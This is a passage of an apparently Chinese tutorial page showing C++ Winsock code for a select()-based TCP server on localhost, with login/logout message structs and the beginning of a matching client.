class="keyword">include</span> <span class="string">&quot;Message.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Server</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">SOCKET servSock;</span><br><span class="line">std::list&lt;SOCKET&gt; clientList;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">coreFunc</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Server</span>() :<span class="built_in">servSock</span>(INVALID_SOCKET) &#123;&#125;;</span><br><span class="line">~<span class="built_in">Server</span>();</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">close</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">init</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* ip, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">start</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">recvMsg</span><span class="params">(fd_set&amp; fdRead, SOCKET&amp; clientSock)</span></span>;</span><br><span class="line"><span class="comment">//bool conductMsg();</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Server.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;server.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">Server::~<span class="built_in">Server</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Server::close</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (servSock != INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">closesocket</span>(servSock);</span><br><span class="line"><span class="keyword">for</span> (SOCKET client : clientList)</span><br><span class="line"><span class="built_in">closesocket</span>(client);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::init</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* ip, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WSADATA data&#123;&#125;;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;data) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;startup error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">servSock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (servSock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;socket error&quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">sockaddr_in servAddr&#123;&#125;;</span><br><span class="line"></span><br><span class="line">servAddr.sin_family = AF_INET;</span><br><span class="line">servAddr.sin_port = <span class="built_in">htons</span>(<span class="number">2345</span>);</span><br><span class="line"><span class="built_in">inet_pton</span>(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;servAddr.sin_addr.S_un.S_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">bind</span>(servSock, (sockaddr*)&amp;servAddr, <span class="built_in">sizeof</span>(sockaddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;bind error&quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">listen</span>(servSock, <span class="number">128</span>) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;listen error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">coreFunc</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::coreFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">assert</span>(servSock != INVALID_SOCKET);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">fd_set fdRead;</span><br><span class="line"><span class="built_in">FD_ZERO</span>(&amp;fdRead);</span><br><span class="line"><span class="built_in">FD_SET</span>(servSock, &amp;fdRead);</span><br><span class="line"><span class="keyword">for</span> (SOCKET client : clientList)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">FD_SET</span>(client, &amp;fdRead);</span><br><span class="line">&#125;</span><br><span class="line">timeval tv&#123; <span class="number">1</span>,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> selectRes = <span class="built_in">select</span>(<span class="number">0</span>, &amp;fdRead, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, &amp;tv);</span><br><span class="line"><span class="keyword">if</span> (selectRes &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; fdRead.fd_count; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fdRead.fd_array[i] == servSock)</span><br><span class="line">&#123;</span><br><span class="line">SOCKET clntSock = <span class="built_in">accept</span>(servSock, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="keyword">if</span> (clntSock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;accept error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">clientList.<span class="built_in">push_back</span>(clntSock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">recvMsg</span>(fdRead, fdRead.fd_array[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (selectRes == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;do something else&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;select func error&quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::recvMsg</span><span class="params">(fd_set&amp; fdRead, SOCKET&amp; clientSock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Header header;</span><br><span class="line"><span class="type">int</span> recvRes = <span class="built_in">recv</span>(clientSock, (<span class="type">char</span>*)&amp;header, <span class="built_in">sizeof</span>(Header), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (recvRes &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Client disconnected:&quot;</span> &lt;&lt; clientSock &lt;&lt; std::endl;</span><br><span class="line">clientList.<span class="built_in">erase</span>(std::<span class="built_in">remove</span>(clientList.<span class="built_in">begin</span>(), clientList.<span class="built_in">end</span>(), clientSock), clientList.<span class="built_in">end</span>());</span><br><span class="line"><span class="built_in">closesocket</span>(clientSock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (header.cmd)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> CMD::LOGIN:</span><br><span class="line">&#123;</span><br><span class="line">Login login;</span><br><span class="line"><span class="type">int</span> recvRes2 = <span class="built_in">recv</span>(clientSock, (<span class="type">char</span>*)&amp;login + <span class="built_in">sizeof</span>(Header),</span><br><span class="line"><span class="built_in">sizeof</span>(Login) - <span class="built_in">sizeof</span>(Header), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (recvRes2 &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;recv error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LoginResult <span class="title">loginResult</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(clientSock, (<span class="type">char</span>*)&amp;loginResult, <span class="built_in">sizeof</span>(LoginResult), <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;send error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> CMD::LOGOUT:</span><br><span class="line">&#123;</span><br><span class="line">Logout logout;</span><br><span class="line"><span class="type">int</span> recvRes2 = <span class="built_in">recv</span>(clientSock, (<span class="type">char</span>*)&amp;logout + <span class="built_in">sizeof</span>(Header),</span><br><span class="line"><span class="built_in">sizeof</span>(Logout) - <span class="built_in">sizeof</span>(Header), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (recvRes2 &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;recv error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LogoutResult <span class="title">logoutResult</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(clientSock, (<span class="type">char</span>*)&amp;logoutResult, <span class="built_in">sizeof</span>(LoginResult), <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;send error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> CMD::LOGIN_RESULT:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CMD::LOGOUT_RESULT:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//bool Server::conductMsg() &#123;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Server server;</span><br><span class="line"><span class="keyword">if</span> (!server.<span class="built_in">init</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">2345</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">server.<span class="built_in">start</span>();</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//message.hpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">CMD</span></span><br><span class="line">&#123;</span><br><span class="line">LOGIN,</span><br><span class="line">LOGOUT,</span><br><span class="line">LOGIN_RESULT,</span><br><span class="line">LOGOUT_RESULT,</span><br><span class="line">NO_CMD</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Header</span></span><br><span class="line">&#123;</span><br><span class="line">CMD cmd;</span><br><span class="line"><span class="type">unsigned</span> dataLength;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Header</span>() : <span class="built_in">cmd</span>(CMD::NO_CMD)</span><br><span class="line">, <span class="built_in">dataLength</span>(<span class="number">0</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Header</span>(CMD cmd_, <span class="type">unsigned</span> dataLength_) : <span class="built_in">cmd</span>(cmd_)</span><br><span class="line">, <span class="built_in">dataLength</span>(dataLength_) &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Login</span> :<span class="keyword">public</span> Header</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> usrName[<span class="number">32</span>];</span><br><span class="line"><span class="type">char</span> passwd[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">Login</span>(<span class="type">const</span> <span class="type">char</span>* userName_, <span class="type">const</span> <span class="type">char</span>* passwd_) :<span class="built_in">Header</span>(CMD::LOGIN, <span class="built_in">sizeof</span>(Login))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy_s</span>(usrName, <span class="number">32</span>, userName_);</span><br><span class="line"><span class="built_in">strcpy_s</span>(passwd, <span class="number">32</span>, passwd_);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Login</span>() :<span class="built_in">Header</span>(CMD::LOGIN, <span class="built_in">sizeof</span>(Login)), usrName&#123; <span class="number">0</span> &#125;, passwd&#123; <span class="number">0</span> &#125; &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Logout</span> : <span class="keyword">public</span> Header</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> logoutNum;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Logout</span>(<span class="type">unsigned</span> logoutNum_) : <span class="built_in">Header</span>(CMD::LOGOUT, <span class="built_in">sizeof</span>(Logout))</span><br><span class="line">, <span class="built_in">logoutNum</span>(logoutNum_) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Logout</span>() :<span class="built_in">Header</span>(CMD::LOGOUT, <span class="built_in">sizeof</span>(Logout)), <span class="built_in">logoutNum</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LoginResult</span> :<span class="keyword">public</span> Header</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> loginResultNum;</span><br><span class="line"><span class="built_in">LoginResult</span>(<span class="type">unsigned</span> loginResultNum_) :<span class="built_in">Header</span>(CMD::LOGIN_RESULT, <span class="built_in">sizeof</span>(LoginResult)), <span class="built_in">loginResultNum</span>(loginResultNum_) &#123;&#125;</span><br><span class="line"><span class="built_in">LoginResult</span>() :<span class="built_in">Header</span>(CMD::LOGIN_RESULT, <span class="built_in">sizeof</span>(LoginResult)), <span class="built_in">loginResultNum</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LogoutResult</span> :<span class="keyword">public</span> Header</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> logoutResultNum;</span><br><span class="line"><span class="built_in">LogoutResult</span>(<span class="type">unsigned</span> logoutResultNum_) :<span class="built_in">Header</span>(CMD::LOGOUT_RESULT, <span class="built_in">sizeof</span>(LogoutResult)), <span class="built_in">logoutResultNum</span>(logoutResultNum_) &#123;&#125;</span><br><span class="line"><span class="built_in">LogoutResult</span>() :<span class="built_in">Header</span>(CMD::LOGOUT_RESULT, <span class="built_in">sizeof</span>(LogoutResult)), <span class="built_in">logoutResultNum</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Message.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WSADATA data&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;data) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;WSAstartup error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">SOCKET servSock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (servSock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;socket error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">sockaddr_in servAddr&#123;&#125;;</span><br><span class="line">servAddr.sin_family = AF_INET;</span><br><span class="line">servAddr.sin_port = <span class="built_in">htons</span>(<span class="number">2345</span>);</span><br><span class="line"><span class="built_in">inet_pton</span>(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;servAddr.sin_addr.S_un.S_addr);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">connect</span>(servSock, (sockaddr*)&amp;servAddr, <span class="built_in">sizeof</span>(sockaddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;connect error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(servSock);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;connect success&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="function">Login <span class="title">login</span><span class="params">(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(servSock, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(&amp;login), <span class="built_in">sizeof</span>(Login), <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;send error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">LoginResult loginResult;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">recv</span>(servSock, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(&amp;loginResult), <span class="built_in">sizeof</span>(LoginResult), <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;recv error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span 